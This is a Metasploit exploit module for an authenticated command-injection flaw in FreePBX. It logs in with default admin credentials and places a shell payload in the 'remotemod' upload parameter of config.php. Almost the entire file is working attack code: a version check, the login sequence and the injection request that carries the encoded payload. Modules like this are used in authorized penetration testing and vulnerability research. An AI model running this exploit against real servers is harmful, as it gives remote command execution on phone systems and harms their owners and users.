##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Exploit::Remote
  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
                      'Name'            => 'FreePBX ISCSI Command Execution',
                      'Description'     => '
                        This module exploits an authenticated remote command execution in FreePBX.
                      ',
                      'License'         => MSF_LICENSE,
                      'Author'          =>
                        [
                          'Ahmed sultan (0x4148) <0x4148@gmail.com>', # discovery of vulnerability
                          'Marcin Styczen <Marcin_Styczen@epam.com>', # msf module
                          'Bartlomiej Pokrzywinski <Bartlomiej_Pokrzywinski@epam.com>', # msf module
                          'Ewerson Guimaraes(Crash) <ewerson.guimaraes@epam.com>', # mentor, msf module
                        ],
                      'References'      =>
                        [
                          %w(EDB 40296)
                        ],
                      'Payload' =>
                        {
                          'Compat' =>
                          {
                            'PayloadType'  => 'cmd',
                            'RequiredCmd'  => 'perl telnet python'
                          }
                        },
                      'Platform'       => %w(linux unix),
                      'Arch'           => ARCH_CMD,
                      'Targets'        => [['Automatic', {}]],
                      'Privileged'     => 'true',
                      'DefaultTarget'  => 0,
                      'DisclosureDate' => 'Aug 29 2016'))

    register_options(
      [
        Opt::RPORT(80),
        OptString.new('USERNAME', [true, 'The username to authenticate as', 'admin']),
        OptString.new('PASSWORD', [true, 'The password to authenticate with', 'admin'])
      ], self.class
    )
  end

  def print_status(msg = '')
    super("#{rhost}:#{rport} - #{msg}")
  end

  def print_error(msg = '')
    super("#{rhost}:#{rport} - #{msg}")
  end

  def print_good(msg = '')
    super("#{rhost}:#{rport} - #{msg}")
  end

  # Application Check
  def check
    res = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'admin', 'CHANGES')
    )

    unless res
      vprint_error('Connection timed out.')
      return Exploit::CheckCode::Unknown
    end

    version = res.body.match(/13\.\d\.\d*/)

    if version
      vprint_status("Found version: #{version}")
      return Exploit::CheckCode::Appears if version > '13.0.0'
    end

    Exploit::CheckCode::Safe
  end

  def exploit
    # Application Login
    vprint_status('Trying to login...')
    res_auth = send_request_cgi(
      'method' => 'POST',
      'uri'    => normalize_uri(target_uri.path, 'admin', 'config.php'),
      'vars_post' => {
        'username' => datastore['USERNAME'],
        'password' => datastore['PASSWORD']
      }
    )
    cookie_split = res_auth.get_cookies.split(';')
    vprint_status("Cookies Found: #{cookie_split[0]}")

    # checking login
    res_check = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'admin', 'config.php'),
      'cookie' => "#{cookie_split[0]};"
    )
    check_login = res_check.body.match(/Welcome to FreePBX/)

    if check_login
      vprint_status('Loged In')
      print_good('Login success')
    else
      fail_with(Failure::Unknown, 'Login failure')
    end

    jnk_cmd = rand_text_alpha(10)
    # malicious request
    res_xpl = send_request_cgi(
      'method' => 'GET',
      'uri'    => normalize_uri(target_uri.path, 'admin', 'config.php'),
      'cookie' => "#{cookie_split[0]};",
      'headers' => {
        'Referer' => "http://#{datastore['RHOST']}/admin/config.php?display=modules&action=upload"
      },
      'vars_get' => {
        'display' => 'modules',
        'action'       => 'upload',
        'download'     => '0x4148',
        'remotemod'    => "http://127.0.0.1/junk&#{payload.encoded};echo #{jnk_cmd} > /tmp/#{jnk_cmd};rm -rf /tmp/#{jnk_cmd}"
      }
    )
    vprint_status('Done...')
    end
end
